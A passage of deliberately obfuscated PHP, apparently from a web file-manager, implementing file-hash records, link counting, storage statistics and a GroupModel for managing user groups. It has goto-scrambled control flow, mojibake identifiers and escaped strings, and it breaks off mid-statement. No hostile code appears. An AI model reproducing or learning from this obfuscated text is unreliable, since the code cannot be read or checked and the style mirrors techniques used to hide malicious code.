IO::size($Eÿë¿Ì†Ë); goto Bß∞≠πˆáΩ; EıÜΩ≥Ùåâ: } public function addFileMake($EëÀ úâñö, $fΩ‹›∑Ö¨Ï, $A¯ÛäÙáÛΩ, $Fê£˜µîı©, $AÑ·¿©–¬ô, $cŒ€æêÔ·å) { goto eıê∑§ùı∑; fÜ€‰Ñ°´õ: $E›ÕËﬂµóÜ = get_path_this($fóÜ¿àπÿ); if ($cŒ€æêÔ·å) { $eÿæ≤¥§í£ = IO::move($EëÀ úâñö, $CÁÏä∫∫í‡, !1, $E›ÕËﬂµóÜ); } else { $eÿæ≤¥§í£ = IO::copy($EëÀ úâñö, $CÁÏä∫∫í‡, !1, $E›ÕËﬂµóÜ); } if (!$eÿæ≤¥§í£) { return !1; } goto d ÔÖˆ”£ı; d ÔÖˆ”£ı: $bÒåæ∏ãüõ = KodIO::defaultDriver(); $Dø¥ÉÈ∆‘’ = array($DÃÛÿΩ˘ùŒ[573] => $fΩ‹›∑Ö¨Ï, $DÃÛÿΩ˘ùŒ[1786] => 1, $DÃÛÿΩ˘ùŒ[415] => $AÑ·¿©–¬ô, $DÃÛÿΩ˘ùŒ[803] => $bÒåæ∏ãüõ[$DÃÛÿΩ˘ùŒ[395]], $DÃÛÿΩ˘ùŒ[416] => $fóÜ¿àπÿ, $DÃÛÿΩ˘ùŒ[1787] => $A¯ÛäÙáÛΩ, $DÃÛÿΩ˘ùŒ[1788] => $Fê£˜µîı©); return $Dø¥ÉÈ∆‘’; goto A¡èë„Ÿ‚…; eıê∑§ùı∑: $DÃÛÿΩ˘ùŒ =& $_SERVER[’ÿƒ†ïò]; $fóÜ¿àπÿ = $this->createFileName($AÑ·¿©–¬ô, $A¯ÛäÙáÛΩ, $Fê£˜µîı©); $CÁÏä∫∫í‡ = get_path_father($fóÜ¿àπÿ); goto fÜ€‰Ñ°´õ; A¡èë„Ÿ‚…: } public function addFileCheckExist($A¯©øùû’€, $D“Ö°’ë»…, $E¿ ÁÀ–—´) { $fﬂÂÇ¥≥‡Ç =& $_SERVER[’ÿƒ†ïò]; $DÀà„ﬂóàó = $this->findByHash($A¯©øùû’€, $D“Ö°’ë»…); if (!$DÀà„ﬂóàó) { return !1; } $DÕß ﬁ¿›¢ = array($fﬂÂÇ¥≥‡Ç[1786] => intval($DÀà„ﬂóàó[$fﬂÂÇ¥≥‡Ç[1790]]) + 1, $fﬂÂÇ¥≥‡Ç[573] => $E¿ ÁÀ–—´); $this->where(array($fﬂÂÇ¥≥‡Ç[462] => $DÀà„ﬂóàó[$fﬂÂÇ¥≥‡Ç[461]]))->save($DÕß ﬁ¿›¢); return $DÀà„ﬂóàó; } public function remove($Fıﬂ›ÓÑúˆ) { $this->linkCountChange($Fıﬂ›ÓÑúˆ, !1); $this->clearEmpty(); return !0; } public function linkAdd($DÛâÂ‚à∂ã) { $this->linkCountChange($DÛâÂ‚à∂ã, !0); } public function linkCountChange($Fµıá©÷∫ı, $E¶´Õôóœ∞) { goto A¶Â¡¨‰ﬂ∏; dû´È¨»‡Ñ: foreach ($F©…Ö¯ƒ®ê as $EÃÓó∑…∂Ô => $eÌûˆÀîÜ„) { $c˜»Úµ…â◊ = $eÌûˆÀîÜ„ . $c≤êàãÉŸ‰[33]; if (!$cÇ•ìÃ∂Ÿõ[$c˜»Úµ…â◊]) { $cÇ•ìÃ∂Ÿõ[$c˜»Úµ…â◊] = array(); } $cÇ•ìÃ∂Ÿõ[$c˜»Úµ…â◊][] = $EÃÓó∑…∂Ô; } foreach ($cÇ•ìÃ∂Ÿõ as $eÌûˆÀîÜ„ => $EÜÉòÌπ√â) { if (!$EÜÉòÌπ√â) { continue; } $eÌûˆÀîÜ„ = $E¶´Õôóœ∞ ? $eÌûˆÀîÜ„ : -intval($eÌûˆÀîÜ„); $a´÷èëÉ∞á = array($c≤êàãÉŸ‰[461] => array($c≤êàãÉŸ‰[7], $EÜÉòÌπ√â)); if ($eÌûˆÀîÜ„ < 0) { $a´÷èëÉ∞á[$c≤êàãÉŸ‰[1790]] = array($c≤êàãÉŸ‰[1002], abs($eÌûˆÀîÜ„)); } $this->where($a´÷èëÉ∞á)->setAdd($c≤êàãÉŸ‰[1790], $eÌûˆÀîÜ„); } goto aÏÎ∏Ú®‚∫; eπÉÇ⁄Ã‡˜: $F©…Ö¯ƒ®ê = array(); foreach ($Fµıá©÷∫ı as $EÃÓó∑…∂Ô) { $c˜»Úµ…â◊ = $EÃÓó∑…∂Ô . $c≤êàãÉŸ‰[33]; if (!$F©…Ö¯ƒ®ê[$c˜»Úµ…â◊]) { $F©…Ö¯ƒ®ê[$c˜»Úµ…â◊] = 0; } $F©…Ö¯ƒ®ê[$c˜»Úµ…â◊]++; } $cÇ•ìÃ∂Ÿõ = array(); goto dû´È¨»‡Ñ; A¶Â¡¨‰ﬂ∏: $c≤êàãÉŸ‰ =& $_SERVER[’ÿƒ†ïò]; if (!$Fµıá©÷∫ı) { return; } if (!is_array($Fµıá©÷∫ı)) { $Fµıá©÷∫ı = array($Fµıá©÷∫ı); } goto eπÉÇ⁄Ã‡˜; aÏÎ∏Ú®‚∫: } public function findByHash($bí¶÷Áêò∂, $câË¿Îà–’ = false) { $CÙáëÒÏñ =& $_SERVER[’ÿƒ†ïò]; if (!$bí¶÷Áêò∂ && !$câË¿Îà–’) { return !1; } $B€öüÉπøµ = array($CÙáëÒÏñ[1787] => $bí¶÷Áêò∂); if ($câË¿Îà–’) { $B€öüÉπøµ = array($CÙáëÒÏñ[1788] => $câË¿Îà–’); } return $this->order($CÙáëÒÏñ[1791])->where($B€öüÉπøµ)->find(); } public function clearEmpty($D’¶≈˘∞˘ﬁ = 0) { goto FÜ¬≠ ºáı; FÜ¬≠ ºáı: $dáø≥€êéö =& $_SERVER[’ÿƒ†ïò]; $BÒÀœéµ∞à = time() - 3600 * 24 * $D’¶≈˘∞˘ﬁ; $aﬁìÙöø¢Ô = $dáø≥€êéö[1792] . $BÒÀœéµ∞à; goto eÿ≥™‹ìçú; eÿ≥™‹ìçú: $fÂı¡ãúéÇ = $this->where($aﬁìÙöø¢Ô)->select(); if (!$fÂı¡ãúéÇ) { return; } $fä†ù¢é˘Ç = new Task($dáø≥€êéö[1793], $dáø≥€êéö[33], count($fÂı¡ãúéÇ)); goto B°äÃáÃ„à; B°äÃáÃ„à: foreach ($fÂı¡ãúéÇ as $a›ﬂ÷à£¬Œ) { $fä†ù¢é˘Ç->update(1); $this->resetFile($a›ﬂ÷à£¬Œ); } $fä†ù¢é˘Ç->end(); goto c¡Ü°œÕﬂ™; c¡Ü°œÕﬂ™: } public function resetFile($e®Æ§òπ˘≤) { goto FÑÜ⁄÷Ù‘à; CÀä˘‡éäü: $D©Ãâ™è…ÿ = Model($Fµïﬂ¯àîå[1794])->where($EØõÕÌáâé)->count(); $BÂèºø´–ë = intval($BúÑ…∫–Ø∂) + intval($D©Ãâ™è…ÿ); if ($BÂèºø´–ë == 0) { IO::remove($e®Æ§òπ˘≤[$Fµïﬂ¯àîå[76]]); Model($Fµïﬂ¯àîå[1795])->delete($e®Æ§òπ˘≤[$Fµïﬂ¯àîå[461]]); $this->where($EØõÕÌáâé)->delete(); $this->metaSet($e®Æ§òπ˘≤[$Fµïﬂ¯àîå[461]], null, null); return; } goto EÜÍ∂Û‹À˘; FÑÜ⁄÷Ù‘à: $Fµïﬂ¯àîå =& $_SERVER[’ÿƒ†ïò]; $EØõÕÌáâé = array($Fµïﬂ¯àîå[462] => $e®Æ§òπ˘≤[$Fµïﬂ¯àîå[461]]); $BúÑ…∫–Ø∂ = Model($Fµïﬂ¯àîå[1234])->where($EØõÕÌáâé)->count(); goto CÀä˘‡éäü; EÜÍ∂Û‹À˘: if ($e®Æ§òπ˘≤[$Fµïﬂ¯àîå[1790]] != $BÂèºø´–ë) { $this->where($EØõÕÌáâé)->save(array($Fµïﬂ¯àîå[1786] => $BÂèºø´–ë)); } goto D√å‡€˜ÚÓ; D√å‡€˜ÚÓ: } public function storageInfo($EÉëª‘üâ¨ = false) { goto cûÕ§¡”—ó; cûÕ§¡”—ó: $A°üìËé˜ñ =& $_SERVER[’ÿƒ†ïò]; $Dµ≥ËÛî±ê = $this->count() + 0.0; $c“£ƒ‘©Í· = 0; goto b®æ°Ëœ£Ë; b®æ°Ëœ£Ë: $fÛ⁄‰Œ¢ÊÁ = 1; $f¨‰ÚÛì‡ó = 0; $AÑå§úπ¨ˆ = 5000; goto BúÂºˆ§≠‘; BúÂºˆ§≠‘: for ($bÊüé´∞∫ß = 0; $bÊüé´∞∫ß < $Dµ≥ËÛî±ê; $bÊüé´∞∫ß = $bÊüé´∞∫ß + $AÑå§úπ¨ˆ) { $cÙ€¶Ê©÷° = $this->limit($bÊüé´∞∫ß, $bÊüé´∞∫ß + $AÑå§úπ¨ˆ)->select(); foreach ($cÙ€¶Ê©÷° as $DÍﬁ®ëéÿÊ) { $fÛ⁄‰Œ¢ÊÁ += $DÍﬁ®ëéÿÊ[$A°üìËé˜ñ[78]] * $DÍﬁ®ëéÿÊ[$A°üìËé˜ñ[1790]]; $c“£ƒ‘©Í· += $DÍﬁ®ëéÿÊ[$A°üìËé˜ñ[78]] * ($DÍﬁ®ëéÿÊ[$A°üìËé˜ñ[1790]] - 1); $f¨‰ÚÛì‡ó += $DÍﬁ®ëéÿÊ[$A°üìËé˜ñ[1790]]; } } $F«öôñËÚ = array($A°üìËé˜ñ[1796] => $fÛ⁄‰Œ¢ÊÁ, $A°üìËé˜ñ[1797] => $c“£ƒ‘©Í·, $A°üìËé˜ñ[1798] => $c“£ƒ‘©Í· / $fÛ⁄‰Œ¢ÊÁ, $A°üìËé˜ñ[82] => $Dµ≥ËÛî±ê, $A°üìËé˜ñ[1799] => $f¨‰ÚÛì‡ó); return $F«öôñËÚ; goto d£Û≤õÒâÍ; d£Û≤õÒâÍ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\x6d\x65" => "\x67\x72\x6f\165\x70\137\155\x65\164\141", "\x6d\145\164\141\106\x69\x65\x6c\x64" => "\147\x72\x6f\165\160\x49\x44"); protected function cacheFunctionAlias($aéñÉéìŒ•) { $EÖÎé†‡·å =& $_SERVER[’ÿƒ†ïò]; return array($EÖÎé†‡·å[1800] => array($aéñÉéìŒ•[0], $EÖÎé†‡·å[1801]), $EÖÎé†‡·å[1802] => array($aéñÉéìŒ•[0], $EÖÎé†‡·å[1803])); } protected function getInfo($E‡ôë°“‡Á, $fê∑—Í◊ú´ = false) { $e“Ù¶—Òè† = $this->getInfoSimple($E‡ôë°“‡Á); if (!$e“Ù¶—Òè†) { return !1; } if ($fê∑—Í◊ú´) { return $this->_listDataApplyItem($e“Ù¶—Òè†); } return $this->cacheFunctionGet($_SERVER[’ÿƒ†ïò][1804], $E‡ôë°“‡Á); } protected function getInfoSimple($e¡Á´Ø˘ö…, $c∂∑ôàöõƒ = false) { $Dáºí–øá≠ =& $_SERVER[’ÿƒ†ïò]; if ($c∂∑ôàöõƒ) { $F≠¡¬Â∞Õó = array($Dáºí–øá≠[1726] => intval($e¡Á´Ø˘ö…)); $Aú”£π¿¡ï = $this->where($F≠¡¬Â∞Õó)->find(); return is_array($Aú”£π¿¡ï) ? $Aú”£π¿¡ï : array(); } return $this->cacheFunctionGet($Dáºí–øá≠[1805], $e¡Á´Ø˘ö…); } protected function groupAdd($aı†æàÛ∂ó) { goto BùºÑı‘º‡; c‰ÍÓåêÌ”: if (!empty($aı†æàÛ∂ó[$D–û™‰¢∫[1726]])) { $eÏÊ˜ìê•ì[$D–û™‰¢∫[1726]] = $aı†æàÛ∂ó[$D–û™‰¢∫[1726]]; } $Eä≠¨èçûæ = $this->add($eÏÊ˜ìê•ì); $this->setNamePinyin($Eä≠¨èçûæ, $eÏÊ˜ìê•ì[$D–û™‰¢∫[28]]); goto Aø‰ÏΩŒ◊ç; FïÍ≈Õ†∞ò: if ($Cã’ﬂö‰⁄Õ[$D–û™‰¢∫[515]]) { $C„ÁÜÏ≈É¶ = $Cã’ﬂö‰⁄Õ[$D–û™‰¢∫[515]] . $Cã’ﬂö‰⁄Õ[$D–û™‰¢∫[1726]] . $D–û™‰¢∫[47]; } $eÏÊ˜ìê•ì = array($D–û™‰¢∫[415] => $this->groupNameAuto($aı†æàÛ∂ó[$D–û™‰¢∫[492]], $aı†æàÛ∂ó[$D–û™‰¢∫[28]]), $D–û™‰¢∫[396] => $aı†æàÛ∂ó[$D–û™‰¢∫[492]], $D–û™‰¢∫[578] => $C„ÁÜÏ≈É¶, $D–û™‰¢∫[1806] => $aı†æàÛ∂ó[$D–û™‰¢∫[1710]], $D–û™‰¢∫[1807] => 0, $D–û™‰¢∫[1730] => 0); if (isset($aı†æàÛ∂ó[$D–û™‰¢∫[1749]])) { $eÏÊ˜ìê•ì[$D–û™‰¢∫[1749]] = $aı†æàÛ∂ó[$D–û™‰¢∫[1749]]; } else { $Bç çºµÉ∂ = $this->max($D–û™‰¢∫[1749]); if (!$Bç çºµÉ∂) { $Bç çºµÉ∂ = 0; } $eÏÊ˜ìê•ì[$D–û™‰¢∫[1749]] = $Bç çºµÉ∂ + 1; } goto c‰ÍÓåêÌ”; BùºÑı‘º‡: $D–û™‰¢∫ =& $_SERVER[’ÿƒ†ïò]; if (!$aı†æàÛ∂ó[$D–û™‰¢∫[492]] && isset($aı†æàÛ∂ó[$D–û™‰¢∫[1726]]) && $aı†æàÛ∂ó[$D–û™‰¢∫[1726]] == 1) { if ($Cã’ﬂö‰⁄Õ = $this->getInfoSimple($aı†æàÛ∂ó[$D–û™‰¢∫[1726]], !0)) { return $aı†æàÛ∂ó[$D–û™‰¢∫[1726]]; } } else { $Cã’ﬂö‰⁄Õ = $this->getInfoSimple($aı†æàÛ∂ó[$D–û™‰¢∫[492]]); if (!$Cã’ﬂö‰⁄Õ) { return !1; } } $C„ÁÜÏ≈É¶ = $D–û™‰¢∫[525]; goto FïÍ≈Õ†∞ò; Aø‰ÏΩŒ◊ç: if (isset($aı†æàÛ∂ó[$D–û™‰¢∫[1808]])) { $this->metaSet($Eä≠¨èçûæ, array($D–û™‰¢∫[1808] => $aı†æàÛ∂ó[$D–û™‰¢∫[1808]], $D–û™‰¢∫[1809] => $aı†æàÛ∂ó[$D–û™‰¢∫[1809]])); unset($aı†æàÛ∂ó[$D–û™‰¢∫[1808]]); unset($aı†æàÛ∂ó[$D–û™‰¢∫[1809]]); } Model($D–û™‰¢∫[1234])->groupRootAdd($Eä≠¨èçûæ); return $Eä≠¨èçûæ; goto d¶Õÿ∏ë„˜; d¶Õÿ∏ë„˜: } protected function groupEdit($b∏…¿è«πê, $c‚Ÿ£ï™˜ó) { goto AòÜ√œÊŸ; AòÜ√œÊŸ: $DΩÒﬂ–öóÛ =& $_SERVER[’ÿƒ†ïò]; $CÊÑºØí Ü = $this->getInfoSimple($b∏…¿è«πê); if (!$CÊÑºØí Ü) { return !1; } goto C∆êˆ∞¢Æë; C∆êˆ∞¢Æë: if (!empty($c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[492]])) { $CÍá¥ÀÜÖ = $this->getInfoSimple($c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[492]]); if (!$CÍá¥ÀÜÖ) { return !1; } if ($CÊÑºØí Ü[$DΩÒﬂ–öóÛ[1726]] == $CÍá¥ÀÜÖ[$DΩÒﬂ–öóÛ[1726]]) { return !1; } if ($c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[492]] != $CÊÑºØí Ü[$DΩÒﬂ–öóÛ[492]]) { if ($CÍá¥ÀÜÖ[$DΩÒﬂ–öóÛ[515]] !== $CÊÑºØí Ü[$DΩÒﬂ–öóÛ[515]] && strpos($CÍá¥ÀÜÖ[$DΩÒﬂ–öóÛ[515]], $CÊÑºØí Ü[$DΩÒﬂ–öóÛ[515]] . $CÊÑºØí Ü[$DΩÒﬂ–öóÛ[1726]] . $DΩÒﬂ–öóÛ[47]) === 0) { return !1; } $c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[578]] = $CÍá¥ÀÜÖ[$DΩÒﬂ–öóÛ[515]] . $c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[492]] . $DΩÒﬂ–öóÛ[47]; $this->_changeChildLevel($CÊÑºØí Ü, $CÍá¥ÀÜÖ); } } if (isset($c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[28]])) { $this->setNamePinyin($b∏…¿è«πê, $c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[28]]); } if (isset($c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[1808]])) { $this->metaSet($b∏…¿è«πê, array($DΩÒﬂ–öóÛ[1808] => $c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[1808]], $DΩÒﬂ–öóÛ[1809] => $c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[1809]])); unset($c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[1808]]); unset($c‚Ÿ£ï™˜ó[$DΩÒﬂ–öóÛ[1809]]); } goto dﬂ—”ÒÀÀ≥; dﬂ—”ÒÀÀ≥: $this->_clearChildrenCache($CÊÑºØí Ü); return $this->where(array($DΩÒﬂ–öóÛ[1810] => $b∏…¿è«πê))->save($c‚Ÿ£ï™˜ó); goto EÌë±„ëÚ«; EÌë±„ëÚ«: } private function _clearChildrenCache($b†¿Ñ≤ˆ‡˜) { $A≈¢Ωßà‘ã =& $_SERVER[’ÿƒ†ïò]; $aÖ÷éñ„Ω = array($A≈¢Ωßà‘ã[578] => array($A≈¢Ωßà‘ã[538], $b†¿Ñ≤ˆ‡˜[$A≈¢Ωßà‘ã[515]] . $b†¿Ñ≤ˆ‡˜[$A≈¢Ωßà‘ã[1726]] . $A≈¢Ωßà‘ã[539])); $dù¥¿ã˘ÇÒ = $this->field($A≈¢Ωßà‘ã[1726])->where($aÖ÷éñ„Ω)->select(); foreach ($dù¥¿ã˘ÇÒ as $A“ô≠Ò”êÌ) { $this->_clearCache($A“ô≠Ò”êÌ[$A≈¢Ωßà‘ã[1726]]); } } private function _clearCache($fÍ„≈»„∫í) { $câÓÜπ»œ’ =& $_SERVER[’ÿƒ†ïò]; $this->cacheFunctionClear($câÓÜπ»œ’[1804], $fÍ„≈»„∫í); $this->cacheFunctionClear($câÓÜπ»œ’[1805], $fÍ„≈»„∫í); } private function _changeChildLevel($BèÉŸÈ”Ûí, $AÃ¯√Á¶Æù, $A¶⁄— ÊëŒ = false) { goto A˘áÙ≤ñ‚÷; c™˘ÒÈí∑ü: $this->_clearChildrenCache($BèÉŸÈ”Ûí); $this->where($c∑˜çÚé®Õ)->data($DüÑ¥Â∞æ√)->save(); goto Fá∞πæÜ€ä; A˘áÙ≤ñ‚÷: $F€æ°Ìéƒâ =& $_SERVER[’ÿƒ†ïò]; $aìﬁØì•¡Ç = $BèÉŸÈ”Ûí[$F€æ°Ìéƒâ[515]] . $BèÉŸÈ”Ûí[$F€æ°Ìéƒâ[1726]] . $F€æ°Ìéƒâ[47]; $Dƒ…ÌÈ⁄≈ô = $AÃ¯√Á¶Æù[$F€æ°Ìéƒâ[515]] . $AÃ¯√Á¶Æù[$F€æ°Ìéƒâ[1726]] . $F€æ°Ìéƒâ[47] . $BèÉŸÈ”Ûí[$F€æ°Ìéƒâ[1726]] . $F€æ°Ìéƒâ[47]; goto c≠ Œ‡≤ Ô; c≠ Œ‡≤ Ô: if ($A¶⁄— ÊëŒ) { $Dƒ…ÌÈ⁄≈ô = $AÃ¯√Á¶Æù[$F€æ°Ìéƒâ[515]] . $AÃ¯√Á¶Æù[$F€æ°Ìéƒâ[1726]] . $F€æ°Ìéƒâ[47]; } $c∑˜çÚé®Õ = array($F€æ°Ìéƒâ[578] => array($F€æ°Ìéƒâ[538], $BèÉŸÈ”Ûí[$F€æ°Ìéƒâ[515]] . $BèÉŸÈ”Ûí[$F€æ°Ìéƒâ[1726]] . $F€æ°Ìéƒâ[539])); $DüÑ¥Â∞æ√ = array($F€æ°Ìéƒâ[578] => array($F€æ°Ìéƒâ[587], "\162\x65\160\154\x61\143\145\x28\160\x61\x72\x65\156\x74\x4c\145\x76\145\154\x2c\47{$aìﬁØì•¡Ç}\47\x2c\47{$Dƒ…ÌÈ⁄≈ô}\x27\51")); goto c™˘ÒÈí∑ü; Fá∞πæÜ€ä: } public function setNamePinyin($E¯Ñ≤©Æ€Û, $Aêó¨“ÖÏ¶ = false) { $DÁíä©≤•ß =& $_SERVER[’ÿƒ†ïò]; if (!$Aêó¨“ÖÏ¶) { $BßØ∂´Ñ«◊ = $this->getInfoSimple($E¯Ñ≤©Æ€Û); $Aêó¨“ÖÏ¶ = $BßØ∂´Ñ«◊[$DÁíä©≤•ß[28]]; } if (!Input::check($Aêó¨“ÖÏ¶, $DÁíä©≤•ß[581])) { $this->metaSet($E¯Ñ≤©Æ€Û, $DÁíä©≤•ß[458], null); $this->metaSet($E¯Ñ≤©Æ€Û, $DÁíä©≤•ß[457], null); return; } $C∂ü∫Ã©¿Ì = array($DÁíä©≤•ß[458] => str_replace($DÁíä©≤•ß[50], $DÁíä©≤•ß[33], Pinyin::get($Aêó¨“ÖÏ¶)), $DÁíä©≤•ß[457] => Pinyin::get($Aêó¨“ÖÏ¶, $DÁíä©≤•ß[582])); $this->metaSet($E¯Ñ≤©Æ€Û, $C∂ü∫Ã©¿Ì); } protected function groupStatus($f‰ñÉò÷…ì, $eÓÁ’¡Ê‰ï) { goto FÖƒúª‘â≈; a€òÑº≥ı≠: if ($eÓÁ’¡Ê‰ï == $c‚ùÛªÛò¯[87]) { $bﬂª∆ßª¨π = $this->parentLevelArray($CãçÉªõÇ[$c‚ùÛªÛò¯[515]]); } else { $c¥Õ≥ÜöΩè = array($c‚ùÛªÛò¯[578] => array($c‚ùÛªÛò¯[538], $CãçÉªõÇ[$c‚ùÛªÛò¯[515]] . $CãçÉªõÇ[$c‚ùÛªÛò¯[1726]] . $c‚ùÛªÛò¯[539])); $bﬂª∆ßª¨π = $this->where($c¥Õ≥ÜöΩè)->field($c‚ùÛªÛò¯[1726])->select(); $bﬂª∆ßª¨π = array_to_keyvalue($bﬂª∆ßª¨π, $c‚ùÛªÛò¯[33], $c‚ùÛªÛò¯[1726]); } $bﬂª∆ßª¨π[] = $CãçÉªõÇ[$c‚ùÛªÛò¯[1726]]; $FıÛÂ¥ËÏÏ = array(); goto F±˘áûÒ´ö; FÖƒúª‘â≈: $c‚ùÛªÛò¯ =& $_SERVER[’ÿƒ†ïò]; $CãçÉªõÇ = $this->getInfoSimple($f‰ñÉò÷…ì); if (!$CãçÉªõÇ) { return !1; } goto a€òÑº≥ı≠; F±˘áûÒ´ö: foreach ($bﬂª∆ßª¨π as $f‰ñÉò÷…ì) { $FıÛÂ¥ËÏÏ[] = array($c‚ùÛªÛò¯[1726] => $f‰ñÉò÷…ì, $c‚ùÛªÛò¯[93] => $c‚ùÛªÛò¯[738], $c‚ùÛªÛò¯[372] => $eÓÁ’¡Ê‰ï); $this->_clearCache($f‰ñÉò÷…ì); } return Model($c‚ùÛªÛò¯[1811])->addAll($FıÛÂ¥ËÏÏ, array(), !0); goto fÖ—Ãôﬂ‡û; fÖ—Ãôﬂ‡û: } protected function groupRemove($Déàù≥ﬂı÷) { goto Büé™ﬁèßÒ; Dœ·ÿ∏„Ì∂: Model($DˆÓï·ãßÙ[820])->groupRootRemove($Déàù≥ﬂı÷); return $this->where($Dº…èÚ†âΩ)->delete(); goto cçœöﬁòèÙ; b·®°æäôÑ: $this->where(array($DˆÓï·ãßÙ[492] => $Déàù≥ﬂı÷))->save(array($DˆÓï·ãßÙ[492] => $b«ûÒªÕ¨¨[$DˆÓï·ãßÙ[492]])); Model($DˆÓï·ãßÙ[1811])->where($Dº…èÚ†âΩ)->delete(); Model($DˆÓï·ãßÙ[1812])->where($Dº…èÚ†âΩ)->delete(); goto Dœ·ÿ∏„Ì∂; Büé™ﬁèßÒ: $DˆÓï·ãßÙ =& $_SERVER[’ÿƒ†ïò]; $Dº…èÚ†âΩ = array($DˆÓï·ãßÙ[1726] => $Déàù≥ﬂı÷); $b«ûÒªÕ¨¨ = $this->where($Dº…èÚ†âΩ)->find(); goto eä‹ı¨¡ôè; eä‹ı¨¡ôè: if (!$b«ûÒªÕ¨¨ || $b«ûÒªÕ¨¨[$DˆÓï·ãßÙ[492]] == 0) { return !1; } $B›ÎïÂÔü– = $this->getInfoSimple($b«ûÒªÕ¨¨[$DˆÓï·ãßÙ[492]]); $this->_changeChildLevel($b«ûÒªÕ¨¨, $B›ÎïÂÔü–, !0); goto b·®°æäôÑ; cçœöﬁòèÙ: } protected function groupSort($cïúõä‚ÑÕ) { $eåãˆÆ·…˘ =& $_SERVER[’ÿƒ†ïò]; $Eº√‘ü›£´ = array(); foreach ($cïúõä‚ÑÕ as $Aç≤˘∂Æª => $cä¨Ø÷œöò) { $Eº√‘ü›£´[] = array($eåãˆÆ·…˘[1726], $cä¨Ø÷œöò, $eåãˆÆ·…˘[1749], $Aç≤˘∂Æª + 1); } $this->saveAll($Eº√‘ü›£´); } public function listData() { $A…ü◊Í‚É‰ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A…ü◊Í‚É‰[$_SERVER[’ÿƒ†ïò][367]]); return $A…ü◊Í‚É‰; } private function _makeOrder($a≥Ø∆£—π≠ = '') { goto A®÷†ÇÕÔƒ; A®÷†ÇÕÔƒ: $E®»”á¡∫Ó =& $_SERVER[’ÿƒ†ïò]; $Cö¯ã∂ÓœØ = array($E®»”á¡∫Ó[1726], $E®»”á¡∫Ó[28], $E®»”á¡∫Ó[1712], $E®»”á¡∫Ó[194]); $F∆Ë¡ö¢†¶ = array($E®»”á¡∫Ó[442] => $E®»”á¡∫Ó[443], $E®»”á¡∫Ó[444] => $E®»”á¡∫Ó[445]); goto A§ï‘ª…‰¶; A§ï‘ª…‰¶: $AÌ£æËüàÈ = Input::get($E®»”á¡∫Ó[449], $E®»”á¡∫Ó[7], $E®»”á¡∫Ó[1730], $Cö¯ã∂ÓœØ); $eºàÙ˘∑£… = Input::get($E®»”á¡∫Ó[450], $E®»”á¡∫Ó[7], $E®»”á¡∫Ó[1813], array($E®»”á¡∫Ó[1813], $E®»”á¡∫Ó[444])); $eºàÙ˘∑£… = $F∆Ë¡ö¢†¶[$eºàÙ˘∑£…]; goto d’ÏÃ”å‹Ñ; d’ÏÃ”å‹Ñ: $a≥Ø∆£—π≠ = $a≥Ø∆£—π≠ . "{$AÌ£æËüàÈ}\40{$eºàÙ˘∑£…}\54\40\147\162\157\x75\160\111\x44\40\x61\x73\x63"; return $this->order($a≥Ø∆£—π≠); goto Dˆ‚⁄õŒÏÌ; Dˆ‚⁄õŒÏÌ: } public function listChild($bâõﬁ£à¯ı) { $d¥Ìà∆Èøí =& $_SERVER[’ÿƒ†ïò]; $B∏íûâì±∑ = $this->where(array($d¥Ìà∆Èøí[492] => $bâõﬁ£à¯ı))->_makeOrder()->selectPage(200); $this->_listDataApply($B∏íûâì±∑[$d¥Ìà∆Èøí[367]]); return $B∏íûâì±∑; } public function listByID($FÙì‘ÚΩ∞È) { goto e©ù»‘⁄‰Ï; AÃÈëÂ‹í¡: return $aÒé÷Çáı≈; goto d•ËôÕïí∂; b⁄¡µ‰–·Ω: $aÒé÷Çáı≈ = $this->where($céÛÿÉ≤•¬)->select(); $aÒé÷Çáı≈ = array_sort_keep($aÒé÷Çáı≈, $aÜÀ˜éÙŸ£[1726], $FÙì‘ÚΩ∞È); $this->_listDataApply($aÒé÷Çáı≈); goto AÃÈëÂ‹í¡; e©ù»‘⁄‰Ï: $aÜÀ˜éÙŸ£ =& $_SERVER[’ÿƒ†ïò]; if (!$FÙì‘ÚΩ∞È) { return array(); } $céÛÿÉ≤•¬ = array($aÜÀ˜éÙŸ£[1726] => array($aÜÀ˜éÙŸ£[7], $FÙì‘ÚΩ∞È)); goto b⁄¡µ‰–·Ω; d•ËôÕïí∂: } public function listSearch($Bﬂ∏ñÒ¶çà) { goto e«∆≠ Òﬂø; f›∫˜‰„‚û: if (!trim($dãÙßÕ¨ùø)) { return !1; } $dãÙßÕ¨ùø = str_replace($fôπ”ÛÎ’Ë[1816], $fôπ”ÛÎ’Ë[1817], $dãÙßÕ¨ùø); $cÏ„–∆–´Ω = array($fôπ”ÛÎ’Ë[1726] => array($fôπ”ÛÎ’Ë[381], "{$dãÙßÕ¨ùø}\x25"), $fôπ”ÛÎ’Ë[28] => array($fôπ”ÛÎ’Ë[381], "\45{$dãÙßÕ¨ùø}\45"), $fôπ”ÛÎ’Ë[987] => $fôπ”ÛÎ’Ë[1818]); goto fòªûöŒÕ; e«∆≠ Òﬂø: $fôπ”ÛÎ’Ë =& $_SERVER[’ÿƒ†ïò]; $dãÙßÕ¨ùø = $Bﬂ∏ñÒ¶çà[$fôπ”ÛÎ’Ë[1814]]; $Dæ‰ø«çÇ» = isset($Bﬂ∏ñÒ¶çà[$fôπ”ÛÎ’Ë[1815]]) ? $Bﬂ∏ñÒ¶çà[$fôπ”ÛÎ’Ë[1815]] : !1; goto f›∫˜‰„‚û; f©òû‰àÑ: $D»ºâÛÀ™ﬁ = $D»ºâÛÀ™ﬁ ? $D»ºâÛÀ™ﬁ : array($fôπ”ÛÎ’Ë[367] => array(), $fôπ”ÛÎ’Ë[364] => array()); if (!$D»ºâÛÀ™ﬁ || count($D»ºâÛÀ™ﬁ[$fôπ”ÛÎ’Ë[367]]) < 5 && Input::check($dãÙßÕ¨ùø, $fôπ”ÛÎ’Ë[316])) { goto D°Ù≈¶ﬁô«; d√º©•Ç‘ö: $Eùü«π≤©ù = 